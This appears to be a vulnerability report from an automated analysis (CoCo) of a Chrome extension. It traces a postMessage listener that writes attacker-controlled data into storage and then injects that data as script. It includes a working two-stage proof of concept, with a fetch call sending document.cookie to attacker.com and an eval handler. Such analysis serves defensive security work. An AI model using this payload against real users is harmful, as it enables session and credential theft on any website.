# CoCo Analysis: bmhapcdoclaafignkpcgcpfangggdnfj

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1 (cs_window_eventListener_message → chrome_storage_local_set_sink)

---

## Sink: cs_window_eventListener_message → chrome_storage_local_set_sink

**CoCo Trace:**
$FilePath$/bmhapcdoclaafignkpcgcpfangggdnfj/opgen_generated_files/cs_0.js
Line 575 - window.addEventListener('message', event => {
Line 579 - let mKey = event.data.params.key;
Line 584 - msgData[mKey] = event.data.params.value;

**Code:**

```javascript
// Content script - postMessage listener (cs_0.js lines 575-602)
window.addEventListener('message', event => {
    if ( event && event.data && event.data.tabmemory ) // ← attacker sets tabmemory: true
    {
        let mKey = event.data.params.key; // ← attacker-controlled key
        switch(event.data.params.action)
        {
            case 'setData':
                let msgData = {};
                msgData[mKey] = event.data.params.value; // ← attacker-controlled value
                chrome.storage.local.set(msgData); // ← writes to storage
                break;
            case 'getData':
                chrome.storage.local.get(mKey, function(data) {
                    initBodyData(data[mKey], event.data.params.handler); // ← reads from storage
                });
                break;
        }
    }
});

// Initialization code that executes storage data (cs_0.js line 596-602)
chrome.storage.local.get(['thp_config'],function(data){
    let config = data['thp_config'];
    if(config && config.startCode)
    {
        initBodyData(config.startCode); // ← executes startCode from storage
    }
});

// Code execution function (earlier in cs_0.js)
function initBodyData(data, handler) {
    let s = document.createElement('script');
    s.appendChild(document.createTextNode(data)); // ← data becomes executable code
    document.body.appendChild(s);
}
```

**Classification:** TRUE POSITIVE

**Exploitable by:** Any website - content script runs on `http://*/*`, `https://*/*`, `file://*/*`

**Attack Vector:** window.postMessage from any webpage

**Attack:**

```javascript
// Stage 1: Write malicious code to storage
window.postMessage({
    tabmemory: true,
    params: {
        action: 'setData',
        key: 'thp_config',
        value: {
            startCode: 'fetch("https://attacker.com/exfil?cookies=" + document.cookie);'
        }
    }
}, '*');

// Stage 2: Read back and execute (or wait for page reload)
// The extension automatically executes thp_config.startCode on initialization
// Alternatively, use getData with handler:
window.postMessage({
    tabmemory: true,
    params: {
        action: 'getData',
        key: 'thp_config',
        handler: 'eval'  // Creates: eval(data['thp_config'])
    }
}, '*');
```

**Impact:** Arbitrary code execution in the context of any webpage. Attacker can:
1. Write malicious JavaScript to storage via setData
2. Have it automatically executed when extension initializes (via thp_config.startCode)
3. Or immediately execute via getData with a handler function
4. This enables stealing cookies, credentials, session tokens, performing actions as the user, and modifying page content on any website.
